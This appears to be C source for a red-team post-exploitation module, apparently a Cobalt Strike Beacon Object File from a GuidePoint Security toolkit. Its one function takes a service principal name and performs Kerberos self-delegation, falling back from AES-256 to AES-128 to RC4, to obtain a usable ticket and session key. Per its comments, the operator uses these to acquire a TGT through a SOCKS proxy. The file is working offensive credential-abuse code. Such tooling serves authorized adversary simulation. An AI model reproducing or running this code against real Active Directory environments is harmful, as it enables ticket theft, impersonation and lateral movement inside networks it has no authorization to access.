/*!
 *
 * PostEx
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

/*!
 *
 * Purpose:
 *
 * Requests a AS-REP response from the KDC and
 * prints the session key back to the caller.
 *
 * With this, we can create a working TGS and
 * acquire a TGT along with it through a socks
 * proxy.
 *
!*/
VOID KrbTgsGo( _In_ PVOID Argv, _In_ INT Argc )
{
	datap	Psr;

	ULONG	KLn = 0;
	ULONG	RLn = 0;
	ULONG	Len = 0;

	PCHAR	Str = NULL;
	PVOID	Key = NULL;
	PVOID	Req = NULL;
	HANDLE	Ntl = NULL;
	PWCHAR	Spn = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Psr, sizeof( Psr ) );

	/* Extract the arguments we need */
	BeaconDataParse( &Psr, Argv, Argc );
	Spn = C_PTR( BeaconDataExtract( &Psr, NULL ) );

	/* An SPN was provided as requested */
	if ( Spn != NULL ) {
		/* Attempt to perform self-delegation using Kerberos Encryption AES-256 */
		if ( ! KrbForgeTicket( Spn, KERB_ETYPE_AES256_CTS_HMAC_SHA1_96, &Req, &RLn, &Key, &KLn ) ) {
			/* Attempt to perform self-delegation using Kerberos Encryption AES-128 */
			if ( ! KrbForgeTicket( Spn, KERB_ETYPE_AES128_CTS_HMAC_SHA1_96, &Req, &RLn, &Key, &KLn ) ) {
				/* Attempt to perform self-delegation using Kerberos Encpryiton RC4 */
				if ( ! KrbForgeTicket( Spn, KERB_ETYPE_RC4_HMAC_NT, &Req, &RLn, &Key, &KLn ) ) {
					BeaconPrintf( CALLBACK_ERROR, "krbtgs was unable to request a useable ticket." );
				};
			};
		};
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Psr, sizeof( Psr ) );
};
